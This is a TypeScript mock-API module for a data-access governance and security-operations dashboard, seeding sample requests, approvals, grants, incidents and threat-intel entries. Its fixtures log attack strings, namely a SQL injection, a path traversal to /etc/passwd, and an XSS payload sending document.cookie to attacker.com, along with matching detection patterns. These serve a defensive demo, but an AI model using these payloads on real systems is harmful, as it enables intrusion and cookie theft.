import {
  AccessRequest,
  Grant,
  Resource,
  GovernanceNotification,
  NotificationSlotSummary,
  SecurityIncident,
  SecurityEvent,
  IpReputation,
  ThreatIntelIndicator,
  SecOpsSummary,
  ServiceNowStatusResponse,
} from '../types';
import type { UserInfo } from './AuthContext';

const STORAGE_KEY_REQUESTS = 'gg_mock_requests';
const STORAGE_KEY_GRANTS = 'gg_mock_grants';
const STORAGE_KEY_NOTIFICATIONS = 'gg_mock_notifications';
const STORAGE_KEY_SECOPS_INCIDENTS = 'gg_mock_secops_incidents';
const STORAGE_KEY_SECOPS_IPS = 'gg_mock_secops_ips';
const STORAGE_KEY_SECOPS_IOCS = 'gg_mock_secops_iocs';
const STORAGE_KEY_SECOPS_EVENTS = 'gg_mock_secops_events';

export const INITIAL_RESOURCES: Resource[] = [
  {
    id: 'D-customers-synth',
    name: 'Synthetic Customer Profiles Dataset',
    type: 'DATASET',
    tier: 'RESTRICTED_SYNTHETIC',
    description: 'De-identified customer demographics, transactions, and behavior logs for evaluation.',
    allowed_actions: ['read_sample', 'read_full', 'export_masked'],
    max_duration_hours: 24,
    required_controls: ['activity_logging', 'synthetic_data_only', 'isolated_workspace'],
    department: 'Customer Intelligence',
    is_active: true,
  },
  {
    id: 'D-claims-synth',
    name: 'Synthetic Insurance Claims Dataset',
    type: 'DATASET',
    tier: 'RESTRICTED_SYNTHETIC',
    description: 'Synthetically generated insurance claim submissions for fraud detection and risk scoring.',
    allowed_actions: ['read_sample', 'read_full'],
    max_duration_hours: 24,
    required_controls: ['activity_logging', 'synthetic_data_only', 'isolated_workspace'],
    department: 'Risk Operations',
    is_active: true,
  },
  {
    id: 'M-sentiment-v1',
    name: 'Customer Sentiment Model v1',
    type: 'MODEL',
    tier: 'INTERNAL_SYNTHETIC',
    description: 'Fine-tuned transformer model for real-time customer sentiment and conversational scoring.',
    allowed_actions: ['query', 'fine_tune'],
    max_duration_hours: 72,
    required_controls: ['activity_logging', 'synthetic_data_only'],
    department: 'AI Engineering',
    is_active: true,
  },
  {
    id: 'M-credit-risk-v2',
    name: 'Credit Risk Scoring Model',
    type: 'MODEL',
    tier: 'TIER_1_CRITICAL',
    description: 'Tier-1 critical machine learning model evaluating borrower risk and probability of default.',
    allowed_actions: ['query'],
    max_duration_hours: 12,
    required_controls: ['activity_logging', 'synthetic_data_only', 'output_filtering'],
    department: 'Risk Analytics',
    is_active: true,
  },
];

export const INITIAL_REQUESTS: AccessRequest[] = [
  {
    id: 'req_ce1533b83e90',
    requester_sub: 'priya',
    requester_id: 'priya',
    requester_name: 'Priya Sharma',
    requester_dept: 'Customer Intelligence',
    resource_id: 'D-customers-synth',
    resource_name: 'Synthetic Customer Profiles Dataset',
    resource_tier: 'RESTRICTED_SYNTHETIC',
    purpose_code: 'MODEL_EVALUATION',
    purpose_text: 'Evaluation of model reasoning and accuracy boundaries for quarterly safety report.',
    actions: ['read_sample', 'read_full', 'export_masked'],
    duration_minutes: 1440,
    duration_hours: 24,
    risk_controls: ['activity_logging', 'synthetic_data_only'],
    status: 'IN_REVIEW',
    created_at: new Date(Date.now() - 3600000 * 5).toISOString(),
    slots: [
      {
        id: 'slot_mgr_01',
        slot_index: 0,
        slot_role: 'manager',
        assigned_sub: 'carol',
        status: 'PENDING',
      },
      {
        id: 'slot_own_01',
        slot_index: 1,
        slot_role: 'resource_owner',
        assigned_sub: 'david',
        status: 'PENDING',
      },
      {
        id: 'slot_rsk_01',
        slot_index: 2,
        slot_role: 'risk_reviewer',
        assigned_sub: 'elena',
        status: 'PENDING',
      },
    ],
  },
  {
    id: 'req_6b7cb0ad54c1',
    requester_sub: 'priya',
    requester_id: 'priya',
    requester_name: 'Priya Sharma',
    requester_dept: 'Risk Operations',
    resource_id: 'D-claims-synth',
    resource_name: 'Synthetic Insurance Claims Dataset',
    resource_tier: 'RESTRICTED_SYNTHETIC',
    purpose_code: 'FRAUD_RULE_TUNING',
    purpose_text: 'Evaluating claims classifier accuracy on synthetic data.',
    actions: ['read_sample'],
    duration_minutes: 720,
    duration_hours: 12,
    risk_controls: ['activity_logging', 'synthetic_data_only', 'isolated_workspace'],
    status: 'IN_REVIEW',
    created_at: new Date(Date.now() - 3600000 * 2).toISOString(),
    slots: [
      {
        id: 'slot_mgr_02',
        slot_index: 0,
        slot_role: 'manager',
        assigned_sub: 'carol',
        status: 'PENDING',
      },
      {
        id: 'slot_own_02',
        slot_index: 1,
        slot_role: 'resource_owner',
        assigned_sub: 'david',
        status: 'PENDING',
      },
      {
        id: 'slot_rsk_02',
        slot_index: 2,
        slot_role: 'risk_reviewer',
        assigned_sub: 'elena',
        status: 'PENDING',
      },
    ],
  },
  {
    id: 'req_demo_approved',
    requester_sub: 'alice',
    requester_id: 'alice',
    requester_name: 'Alice Chen',
    requester_dept: 'AI Engineering',
    resource_id: 'M-sentiment-v1',
    resource_name: 'Customer Sentiment Model v1',
    resource_tier: 'INTERNAL_SYNTHETIC',
    purpose_code: 'PROTOTYPE_DEMO',
    purpose_text: 'Production readiness validation and sentiment scoring benchmarking.',
    actions: ['query'],
    duration_minutes: 2880,
    duration_hours: 48,
    risk_controls: ['activity_logging', 'synthetic_data_only'],
    status: 'APPROVED',
    created_at: new Date(Date.now() - 3600000 * 24).toISOString(),
    slots: [
      {
        id: 'slot_mgr_03',
        slot_index: 0,
        slot_role: 'manager',
        assigned_sub: 'carol',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Approved for scheduled evaluation window.',
        decided_by_sub: 'carol',
        decided_at: new Date(Date.now() - 3600000 * 23).toISOString(),
      },
      {
        id: 'slot_own_03',
        slot_index: 1,
        slot_role: 'resource_owner',
        assigned_sub: 'david',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Technical resource access confirmed safe.',
        decided_by_sub: 'david',
        decided_at: new Date(Date.now() - 3600000 * 22).toISOString(),
      },
      {
        id: 'slot_rsk_03',
        slot_index: 2,
        slot_role: 'risk_reviewer',
        assigned_sub: 'elena',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Synthetic data boundary verified with strict logging.',
        decided_by_sub: 'elena',
        decided_at: new Date(Date.now() - 3600000 * 21).toISOString(),
      },
    ],
  },
  {
    id: 'req_priya_claims_approved',
    requester_sub: 'priya',
    requester_id: 'priya',
    requester_name: 'Priya Sharma',
    requester_dept: 'Risk Operations',
    resource_id: 'D-claims-synth',
    resource_name: 'Synthetic Insurance Claims Dataset',
    resource_tier: 'RESTRICTED_SYNTHETIC',
    purpose_code: 'FRAUD_RULE_TUNING',
    purpose_text: 'Evaluating claims classifier accuracy on synthetic data.',
    actions: ['read_sample'],
    duration_minutes: 1440,
    duration_hours: 24,
    risk_controls: ['activity_logging', 'synthetic_data_only', 'isolated_workspace'],
    status: 'APPROVED',
    created_at: new Date(Date.now() - 3600000 * 6).toISOString(),
    slots: [
      {
        id: 'slot_priya_mgr_01',
        slot_index: 0,
        slot_role: 'manager',
        assigned_sub: 'carol',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Approved for fraud detection benchmarking in isolated workspace.',
        decided_by_sub: 'carol',
        decided_at: new Date(Date.now() - 3600000 * 5).toISOString(),
      },
      {
        id: 'slot_priya_own_01',
        slot_index: 1,
        slot_role: 'resource_owner',
        assigned_sub: 'david',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Synthetic claims dataset sample read parameters verified.',
        decided_by_sub: 'david',
        decided_at: new Date(Date.now() - 3600000 * 4.5).toISOString(),
      },
      {
        id: 'slot_priya_rsk_01',
        slot_index: 2,
        slot_role: 'risk_reviewer',
        assigned_sub: 'elena',
        status: 'NARROWED',
        decision: 'NARROW',
        rationale: 'Approved with duration capped at 24h and activity logging enforced (SG-6).',
        approved_limits: { duration_minutes: 1440, actions: ['read_sample'] },
        decided_by_sub: 'elena',
        decided_at: new Date(Date.now() - 3600000 * 4).toISOString(),
      },
    ],
  },
  {
    id: 'req_priya_credit_rejected',
    requester_sub: 'priya',
    requester_id: 'priya',
    requester_name: 'Priya Sharma',
    requester_dept: 'Customer Intelligence',
    resource_id: 'M-credit-risk-v2',
    resource_name: 'Credit Risk Scoring Model',
    resource_tier: 'TIER_1_CRITICAL',
    purpose_code: 'MODEL_EVALUATION',
    purpose_text: 'Model bias audit and quarterly scoring benchmark.',
    actions: ['query'],
    duration_minutes: 720,
    duration_hours: 12,
    risk_controls: ['activity_logging', 'output_filtering'],
    status: 'REJECTED',
    created_at: new Date(Date.now() - 3600000 * 10).toISOString(),
    slots: [
      {
        id: 'slot_priya_rej_mgr',
        slot_index: 0,
        slot_role: 'manager',
        assigned_sub: 'carol',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Business justification confirmed for quarterly risk modeling.',
        decided_by_sub: 'carol',
        decided_at: new Date(Date.now() - 3600000 * 9).toISOString(),
      },
      {
        id: 'slot_priya_rej_own',
        slot_index: 1,
        slot_role: 'resource_owner',
        assigned_sub: 'david',
        status: 'APPROVED',
        decision: 'APPROVE',
        rationale: 'Model query endpoint available.',
        decided_by_sub: 'david',
        decided_at: new Date(Date.now() - 3600000 * 8.5).toISOString(),
      },
      {
        id: 'slot_priya_rej_rsk',
        slot_index: 2,
        slot_role: 'risk_reviewer',
        assigned_sub: 'elena',
        status: 'REJECTED',
        decision: 'REJECT',
        rationale: 'Tier-1 critical model export violates SG-2 cross-tier policy without hardware containment.',
        decided_by_sub: 'elena',
        decided_at: new Date(Date.now() - 3600000 * 8).toISOString(),
      },
    ],
  },
];

export const INITIAL_GRANTS: Grant[] = [
  {
    id: 'grant_synth_cust_01',
    request_id: 'req_demo_approved',
    requester_sub: 'alice',
    subject_id: 'alice',
    subject_name: 'Alice Chen',
    resource_id: 'M-sentiment-v1',
    resource_name: 'Customer Sentiment Model v1',
    resource_tier: 'INTERNAL_SYNTHETIC',
    purpose_code: 'PROTOTYPE_DEMO',
    actions: ['query'],
    duration_seconds: 172800,
    status: 'ACTIVE',
    effective_status: 'ACTIVE',
    activated_at: new Date(Date.now() - 3600000 * 21).toISOString(),
    expires_at: new Date(Date.now() + 3600000 * 27).toISOString(),
    invocation_count: 58,
    utilization_status: 'ACTIVE_UTILIZING',
  },
  {
    id: 'grant_claims_priya_02',
    request_id: 'req_priya_claims_approved',
    requester_sub: 'priya',
    subject_id: 'priya',
    subject_name: 'Priya Sharma',
    resource_id: 'D-claims-synth',
    resource_name: 'Synthetic Insurance Claims Dataset',
    resource_tier: 'RESTRICTED_SYNTHETIC',
    purpose_code: 'FRAUD_RULE_TUNING',
    actions: ['read_sample'],
    duration_seconds: 86400,
    status: 'ACTIVE',
    effective_status: 'ACTIVE',
    activated_at: new Date(Date.now() - 3600000 * 4).toISOString(),
    expires_at: new Date(Date.now() + 3600000 * 20).toISOString(),
    invocation_count: 24,
    utilization_status: 'ACTIVE_UTILIZING',
  },
];

export const INITIAL_NOTIFICATIONS: GovernanceNotification[] = [
  {
    id: 'notif_001',
    to_sub: 'priya',
    kind: 'REQUEST_APPROVED',
    ref_id: 'grant_claims_priya_02',
    request_id: 'req_priya_claims_approved',
    grant_id: 'grant_claims_priya_02',
    resource_name: 'Synthetic Insurance Claims Dataset',
    title: 'Access Request Approved',
    message: 'Access request req_priya_claims for Synthetic Insurance Claims Dataset was APPROVED by all reviewers! An active grant is now enforced.',
    summary_breakdown: [
      {
        slot_role: 'Manager',
        reviewer_name: 'Carol Danvers',
        reviewer_sub: 'carol',
        decision: 'APPROVED',
        rationale: 'Approved for fraud detection benchmarking in isolated workspace.',
        decided_at: new Date(Date.now() - 3600000 * 5).toISOString(),
      },
      {
        slot_role: 'Resource Owner',
        reviewer_name: 'David Miller',
        reviewer_sub: 'david',
        decision: 'APPROVED',
        rationale: 'Synthetic claims dataset sample read parameters verified.',
        decided_at: new Date(Date.now() - 3600000 * 4.5).toISOString(),
      },
      {
        slot_role: 'Risk Reviewer',
        reviewer_name: 'Elena Rostova',
        reviewer_sub: 'elena',
        decision: 'NARROWED',
        rationale: 'Approved with duration capped at 24h and activity logging enforced (SG-6).',
        decided_at: new Date(Date.now() - 3600000 * 4).toISOString(),
      },
    ],
    created_at: new Date(Date.now() - 3600000 * 4).toISOString(),
    read: false,
  },
  {
    id: 'notif_002',
    to_sub: 'priya',
    kind: 'REQUEST_REJECTED',
    ref_id: 'req_priya_credit_rejected',
    request_id: 'req_priya_credit_rejected',
    resource_name: 'Credit Risk Scoring Model',
    title: 'Access Request Rejected',
    message: 'Access request req_priya_credit for Credit Risk Scoring Model was REJECTED by Elena Rostova (Risk Reviewer).',
    summary_breakdown: [
      {
        slot_role: 'Manager',
        reviewer_name: 'Carol Danvers',
        reviewer_sub: 'carol',
        decision: 'APPROVED',
        rationale: 'Business justification confirmed for quarterly risk modeling.',
        decided_at: new Date(Date.now() - 3600000 * 9).toISOString(),
      },
      {
        slot_role: 'Resource Owner',
        reviewer_name: 'David Miller',
        reviewer_sub: 'david',
        decision: 'APPROVED',
        rationale: 'Model query endpoint available.',
        decided_at: new Date(Date.now() - 3600000 * 8.5).toISOString(),
      },
      {
        slot_role: 'Risk Reviewer',
        reviewer_name: 'Elena Rostova',
        reviewer_sub: 'elena',
        decision: 'REJECTED',
        rationale: 'Tier-1 critical model export violates SG-2 cross-tier policy without hardware containment.',
        decided_at: new Date(Date.now() - 3600000 * 8).toISOString(),
      },
    ],
    created_at: new Date(Date.now() - 3600000 * 8).toISOString(),
    read: false,
  },
  {
    id: 'notif_003',
    to_sub: 'priya',
    kind: 'SECURITY_ALERT',
    ref_id: 'audit_event_join_block',
    resource_name: 'Employee Records → Salary Records',
    title: 'Security Alert: Join Blocked',
    message: 'Blocked join attempt on Employee Records → Salary Records under SG-2 separation rule.',
    summary_breakdown: [],
    created_at: new Date(Date.now() - 3600000 * 18).toISOString(),
    read: true,
  },
];

export const INITIAL_SECOPS_INCIDENTS: SecurityIncident[] = [
  {
    id: 'INC-2026-0091',
    title: 'SQL Injection Probe via Model Query Parameter',
    description: 'Detected union-based SQL injection attempt targeting synthetic model registry from untrusted IP 198.51.100.99. WAF gateway intercepted and dropped request.',
    source_ip: '198.51.100.99',
    severity: 'CRITICAL',
    priority: 'P1',
    status: 'NEW',
    created_at: new Date(Date.now() - 3600000 * 2).toISOString(),
    updated_at: new Date(Date.now() - 3600000 * 2).toISOString(),
    assigned_to: 'SecOps Incident Commander',
    investigation_notes: [
      {
        note_id: 'note_sqli_01',
        timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
        author: 'WAF Gateway Sentinel',
        text: 'Triggered by high-confidence regex match [UNION SELECT]. IP isolated in temporary blocklist.',
      },
    ],
    servicenow_number: 'SIR0010042',
    servicenow_sys_id: 'sn_sys_9941a8bc',
    webhook_status: 'DISPATCHED',
    associated_events: [
      {
        id: 'ev_sqli_001',
        timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
        category: 'SQLI',
        pattern: "admin' UNION SELECT id, password_hash FROM users WHERE '1'='1",
        risk_score: 95,
        severity: 'CRITICAL',
        action: 'BLOCKED',
        path: '/api/resources/finance.csv/query',
      },
    ],
  },
  {
    id: 'INC-2026-0088',
    title: 'Path Traversal Vulnerability Scan',
    description: 'Repeated dot-dot-slash sequence detected attempting to escape sandbox directory and access root filesystem.',
    source_ip: '203.0.113.44',
    severity: 'HIGH',
    priority: 'P2',
    status: 'INVESTIGATING',
    created_at: new Date(Date.now() - 3600000 * 6).toISOString(),
    updated_at: new Date(Date.now() - 3600000 * 5).toISOString(),
    assigned_to: 'Elena Rostova',
    investigation_notes: [
      {
        note_id: 'note_pt_01',
        timestamp: new Date(Date.now() - 3600000 * 5.5).toISOString(),
        author: 'Elena Rostova',
        text: 'Investigating source subnet and correlated attempts across microservices.',
      },
    ],
    servicenow_number: 'SIR0010039',
    servicenow_sys_id: 'sn_sys_8812c3de',
    webhook_status: 'DISPATCHED',
    associated_events: [
      {
        id: 'ev_pt_002',
        timestamp: new Date(Date.now() - 3600000 * 6).toISOString(),
        category: 'PATH_TRAVERSAL',
        pattern: '../../../../etc/passwd%00',
        risk_score: 85,
        severity: 'HIGH',
        action: 'BLOCKED',
        path: '/api/resources/download',
      },
    ],
  },
  {
    id: 'INC-2026-0075',
    title: 'Cross-Site Scripting (XSS) in Access Request Form',
    description: 'Malicious JavaScript payload embedded into access request purpose text. Neutralized and contained by input sanitizer.',
    source_ip: '198.51.100.12',
    severity: 'MEDIUM',
    priority: 'P3',
    status: 'CONTAINED',
    created_at: new Date(Date.now() - 3600000 * 18).toISOString(),
    updated_at: new Date(Date.now() - 3600000 * 16).toISOString(),
    assigned_to: 'David Miller',
    investigation_notes: [
      {
        note_id: 'note_xss_01',
        timestamp: new Date(Date.now() - 3600000 * 17).toISOString(),
        author: 'David Miller',
        text: 'Payload sanitized. Submitter informed and user session scrutinized.',
      },
    ],
    servicenow_number: 'SIR0010031',
    servicenow_sys_id: 'sn_sys_7733f1ab',
    webhook_status: 'ACKNOWLEDGED',
    associated_events: [
      {
        id: 'ev_xss_003',
        timestamp: new Date(Date.now() - 3600000 * 18).toISOString(),
        category: 'XSS',
        pattern: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
        risk_score: 75,
        severity: 'MEDIUM',
        action: 'FLAGGED',
        path: '/api/requests',
      },
    ],
  },
];

export const INITIAL_SECOPS_IPS: IpReputation[] = [
  {
    ip: '198.51.100.99',
    status: 'TEMP_BLOCKED',
    risk_score: 95,
    malicious_attempts: 14,
    last_seen_at: new Date(Date.now() - 3600000 * 2).toISOString(),
    blocked_until: new Date(Date.now() + 3600000 * 22).toISOString(),
    block_reason: 'Automated containment: Repeated SQL injection attacks against API endpoints.',
    manual_override: false,
  },
  {
    ip: '203.0.113.44',
    status: 'TEMP_BLOCKED',
    risk_score: 85,
    malicious_attempts: 8,
    last_seen_at: new Date(Date.now() - 3600000 * 6).toISOString(),
    blocked_until: new Date(Date.now() + 3600000 * 18).toISOString(),
    block_reason: 'Automated containment: Path traversal exploit probe.',
    manual_override: false,
  },
  {
    ip: '192.0.2.77',
    status: 'PERM_BLOCKED',
    risk_score: 100,
    malicious_attempts: 42,
    last_seen_at: new Date(Date.now() - 3600000 * 36).toISOString(),
    block_reason: 'Administrative block: Known adversarial botnet command execution infrastructure.',
    manual_override: true,
  },
  {
    ip: '198.51.100.12',
    status: 'FLAGGED',
    risk_score: 55,
    malicious_attempts: 3,
    last_seen_at: new Date(Date.now() - 3600000 * 18).toISOString(),
    block_reason: 'Flagged for suspicious HTML/script parameter patterns.',
    manual_override: false,
  },
  {
    ip: '127.0.0.1',
    status: 'ALLOWLISTED',
    risk_score: 0,
    malicious_attempts: 0,
    last_seen_at: new Date().toISOString(),
    block_reason: 'Trusted localhost loopback adapter.',
    manual_override: true,
  },
  {
    ip: '10.0.0.15',
    status: 'ALLOWLISTED',
    risk_score: 0,
    malicious_attempts: 0,
    last_seen_at: new Date().toISOString(),
    block_reason: 'Internal corporate VPN gateway.',
    manual_override: true,
  },
];

export const INITIAL_SECOPS_IOCS: ThreatIntelIndicator[] = [
  {
    id: 'ioc_001',
    type: 'IP',
    value: '198.51.100.99',
    threat_actor: 'APT-29 Recon Cluster',
    campaign: 'Q4 Financial API Recon',
    confidence: 90,
    description: 'High-frequency SQL injection crawler attempting authorization bypass.',
    added_at: new Date(Date.now() - 3600000 * 24).toISOString(),
  },
  {
    id: 'ioc_002',
    type: 'DOMAIN',
    value: 'malicious-eval-exfil.xyz',
    threat_actor: 'FIN7 Shadow Group',
    campaign: 'Corporate Data Exfiltration',
    confidence: 95,
    description: 'Known C2 destination referenced in outbound payload simulations.',
    added_at: new Date(Date.now() - 3600000 * 48).toISOString(),
  },
  {
    id: 'ioc_003',
    type: 'HASH',
    value: 'e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855',
    threat_actor: 'Lazarus Group',
    campaign: 'Trojanized PyTorch Weights',
    confidence: 88,
    description: 'SHA-256 fingerprint of corrupted model checkpoint attempting remote code execution.',
    added_at: new Date(Date.now() - 3600000 * 72).toISOString(),
  },
];

export const INITIAL_SECOPS_EVENTS: SecurityEvent[] = [
  {
    id: 'ev_sqli_001',
    timestamp: new Date(Date.now() - 3600000 * 2).toISOString(),
    source_ip: '198.51.100.99',
    method: 'POST',
    path: '/api/resources/finance.csv/query',
    payload_snippet: "admin' UNION SELECT id, password_hash FROM users WHERE '1'='1",
    category: 'SQLI',
    risk_score: 95,
    severity: 'CRITICAL',
    action_taken: 'BLOCKED',
    incident_id: 'INC-2026-0091',
    pattern_matched: 'UNION SELECT',
    repeat_count: 1,
    status: 'PROCESSED',
  },
  {
    id: 'ev_pt_002',
    timestamp: new Date(Date.now() - 3600000 * 6).toISOString(),
    source_ip: '203.0.113.44',
    method: 'GET',
    path: '/api/resources/download',
    payload_snippet: '../../../../etc/passwd%00',
    category: 'PATH_TRAVERSAL',
    risk_score: 85,
    severity: 'HIGH',
    action_taken: 'BLOCKED',
    incident_id: 'INC-2026-0088',
    pattern_matched: '../..',
    repeat_count: 1,
    status: 'PROCESSED',
  },
  {
    id: 'ev_xss_003',
    timestamp: new Date(Date.now() - 3600000 * 18).toISOString(),
    source_ip: '198.51.100.12',
    method: 'POST',
    path: '/api/requests',
    payload_snippet: '<script>fetch("https://attacker.com/steal?c="+document.cookie)</script>',
    category: 'XSS',
    risk_score: 75,
    severity: 'MEDIUM',
    action_taken: 'FLAGGED',
    incident_id: 'INC-2026-0075',
    pattern_matched: '<script>',
    repeat_count: 1,
    status: 'PROCESSED',
  },
  {
    id: 'ev_clean_004',
    timestamp: new Date(Date.now() - 3600000 * 1).toISOString(),
    source_ip: '127.0.0.1',
    method: 'GET',
    path: '/api/my-access',
    payload_snippet: 'Authorized telemetry inspection',
    category: 'CLEAN',
    risk_score: 0,
    severity: 'LOW',
    action_taken: 'ALLOWED',
    repeat_count: 1,
    status: 'PROCESSED',
  },
];

function getStoredRequests(): AccessRequest[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_REQUESTS);
    if (raw) return JSON.parse(raw);
  } catch {
    // Fall back to initial
  }
  return INITIAL_REQUESTS;
}

function saveStoredRequests(requests: AccessRequest[]) {
  try {
    localStorage.setItem(STORAGE_KEY_REQUESTS, JSON.stringify(requests));
  } catch {}
}

function getStoredGrants(): Grant[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_GRANTS);
    if (raw) return JSON.parse(raw);
  } catch {
    // Fall back to initial
  }
  return INITIAL_GRANTS;
}

function saveStoredGrants(grants: Grant[]) {
  try {
    localStorage.setItem(STORAGE_KEY_GRANTS, JSON.stringify(grants));
  } catch {}
}

function getStoredNotifications(): GovernanceNotification[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_NOTIFICATIONS);
    if (raw) return JSON.parse(raw);
  } catch {
    // Fall back to initial
  }
  return INITIAL_NOTIFICATIONS;
}

function saveStoredNotifications(notifs: GovernanceNotification[]) {
  try {
    localStorage.setItem(STORAGE_KEY_NOTIFICATIONS, JSON.stringify(notifs));
  } catch {}
}

function getStoredIncidents(): SecurityIncident[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_SECOPS_INCIDENTS);
    if (raw) return JSON.parse(raw);
  } catch {}
  return INITIAL_SECOPS_INCIDENTS;
}

function saveStoredIncidents(incidents: SecurityIncident[]) {
  try {
    localStorage.setItem(STORAGE_KEY_SECOPS_INCIDENTS, JSON.stringify(incidents));
  } catch {}
}

function getStoredIps(): IpReputation[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_SECOPS_IPS);
    if (raw) return JSON.parse(raw);
  } catch {}
  return INITIAL_SECOPS_IPS;
}

function saveStoredIps(ips: IpReputation[]) {
  try {
    localStorage.setItem(STORAGE_KEY_SECOPS_IPS, JSON.stringify(ips));
  } catch {}
}

function getStoredIocs(): ThreatIntelIndicator[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_SECOPS_IOCS);
    if (raw) return JSON.parse(raw);
  } catch {}
  return INITIAL_SECOPS_IOCS;
}

function saveStoredIocs(iocs: ThreatIntelIndicator[]) {
  try {
    localStorage.setItem(STORAGE_KEY_SECOPS_IOCS, JSON.stringify(iocs));
  } catch {}
}

function getStoredEvents(): SecurityEvent[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_SECOPS_EVENTS);
    if (raw) return JSON.parse(raw);
  } catch {}
  return INITIAL_SECOPS_EVENTS;
}

function saveStoredEvents(events: SecurityEvent[]) {
  try {
    localStorage.setItem(STORAGE_KEY_SECOPS_EVENTS, JSON.stringify(events));
  } catch {}
}


export function handleMockApi(path: string, options: RequestInit = {}, currentUser?: UserInfo | null): any {
  const method = (options.method || 'GET').toUpperCase();
  const url = new URL(path, 'http://localhost');
  const pathname = url.pathname;

  // 1. Resources
  if (pathname === '/api/resources' && method === 'GET') {
    return INITIAL_RESOURCES;
  }

  // 2. Requests list
  if (pathname === '/api/requests' && method === 'GET') {
    const requests = getStoredRequests();
    const view = url.searchParams.get('view') || 'mine';
    const sub = currentUser?.sub || 'priya';
    const roles = (currentUser?.roles || []).map((r: string) => r.toLowerCase());
    const isAdmin = roles.includes('admin') || roles.includes('executive');

    if (view === 'mine') {
      return requests.filter((r) => r.requester_sub === sub);
    }
    if (view === 'assigned') {
      return requests.filter((r) => {
        if (r.requester_sub === sub) return false;
        return r.slots?.some(
          (s) => s.status === 'PENDING' && (s.assigned_sub === sub || roles.includes(s.slot_role.toLowerCase()))
        );
      });
    }
    if (view === 'visible' || view === 'all') {
      if (isAdmin) return requests;
      return requests.filter(
        (r) =>
          r.requester_sub === sub ||
          r.slots?.some((s) => s.assigned_sub === sub || roles.includes(s.slot_role.toLowerCase()))
      );
    }
    return requests;
  }

  // 3. Submit Request
  if (pathname === '/api/requests' && method === 'POST') {
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const resId = body.resource_id;
    const resource = INITIAL_RESOURCES.find((r) => r.id === resId) || INITIAL_RESOURCES[0];
    const sub = currentUser?.sub || 'priya';
    const displayName = currentUser?.display_name || 'Priya Sharma';

    const newReqId = `req_${Date.now().toString(36)}`;
    const newReq: AccessRequest = {
      id: newReqId,
      requester_sub: sub,
      requester_id: sub,
      requester_name: displayName,
      requester_dept: 'Engineering',
      resource_id: resId,
      resource_name: resource.name,
      resource_tier: resource.tier,
      purpose_code: body.purpose_code || 'MODEL_EVALUATION',
      purpose_text: body.purpose_text || 'Business evaluation purpose declared under multi-party governance.',
      actions: body.actions || resource.allowed_actions,
      duration_minutes: body.duration_minutes || 1440,
      duration_hours: Math.round((body.duration_minutes || 1440) / 60),
      risk_controls: body.risk_controls || ['activity_logging', 'synthetic_data_only'],
      status: 'IN_REVIEW',
      created_at: new Date().toISOString(),
      slots: [
        {
          id: `slot_mgr_${Date.now()}`,
          slot_index: 0,
          slot_role: 'manager',
          assigned_sub: 'carol',
          status: 'PENDING',
        },
        {
          id: `slot_own_${Date.now() + 1}`,
          slot_index: 1,
          slot_role: 'resource_owner',
          assigned_sub: 'david',
          status: 'PENDING',
        },
        {
          id: `slot_rsk_${Date.now() + 2}`,
          slot_index: 2,
          slot_role: 'risk_reviewer',
          assigned_sub: 'elena',
          status: 'PENDING',
        },
      ],
    };

    const requests = getStoredRequests();
    saveStoredRequests([newReq, ...requests]);
    return newReq;
  }

  // 4. Single Request detail
  if (pathname.startsWith('/api/requests/') && method === 'GET' && !pathname.includes('/slots/') && !pathname.includes('/withdraw')) {
    const reqId = pathname.replace('/api/requests/', '');
    const requests = getStoredRequests();
    const req = requests.find((r) => r.id === reqId);
    if (!req) return requests[0];
    return req;
  }

  // 5. Review slot decision
  const isDecisionRoute =
    (pathname.endsWith('/decisions') || (pathname.includes('/slots/') && pathname.endsWith('/decision'))) &&
    method === 'POST';
  if (isDecisionRoute) {
    const parts = pathname.split('/');
    const reqId = parts[3];
    const body = options.body ? JSON.parse(String(options.body)) : {};
    const slotId = body.slot_id || (parts[4] === 'slots' ? parts[5] : null);
    const requests = getStoredRequests();

    const reqIdx = requests.findIndex((r) => r.id === reqId);
    if (reqIdx >= 0) {
      const req = { ...requests[reqIdx] };
      const slot = req.slots.find((s) => s.id === slotId || (body.slot_role && s.slot_role === body.slot_role));
      if (slot) {
        const decUpper = String(body.decision || 'APPROVE').toUpperCase();
        slot.decision = decUpper;
        slot.status = decUpper === 'REJECT' ? 'REJECTED' : (decUpper === 'NARROW' || body.approved_limits ? 'NARROWED' : 'APPROVED');
        slot.rationale = body.rationale || 'Reviewed and decided under multi-party governance.';
        slot.decided_by_sub = currentUser?.sub || 'reviewer';
        slot.decided_at = new Date().toISOString();
        if (body.approved_limits) {
          slot.approved_limits = body.approved_limits;
        }
      }

      // Check all slots
      const allApproved = req.slots.every((s) => s.status === 'APPROVED' || s.status === 'NARROWED');
      const anyRejected = req.slots.some((s) => s.status === 'REJECTED');

      if (anyRejected) {
        req.status = 'REJECTED';

        // Notify requester of rejection with reviewer breakdown
        const rejectingSlot = req.slots.find((s) => s.status === 'REJECTED');
        const revName = currentUser?.display_name || currentUser?.sub || rejectingSlot?.assigned_sub || 'Reviewer';
        const notifs = getStoredNotifications();
        const breakdown: NotificationSlotSummary[] = req.slots.map((s) => ({
          slot_role: s.slot_role,
          reviewer_name:
            s.decided_by_sub && currentUser && s.decided_by_sub === currentUser.sub
              ? (currentUser.display_name || currentUser.sub)
              : s.decided_by_sub || s.assigned_sub || 'Assigned Reviewer',
          reviewer_sub: s.decided_by_sub || s.assigned_sub || 'reviewer',
          decision: (s.status as any) || 'PENDING',
          rationale: s.rationale || 'Pending review',
          decided_at: s.decided_at,
        }));


        notifs.unshift({
          id: `notif_${Date.now().toString(36)}`,
          to_sub: req.requester_sub,
          kind: 'REQUEST_REJECTED',
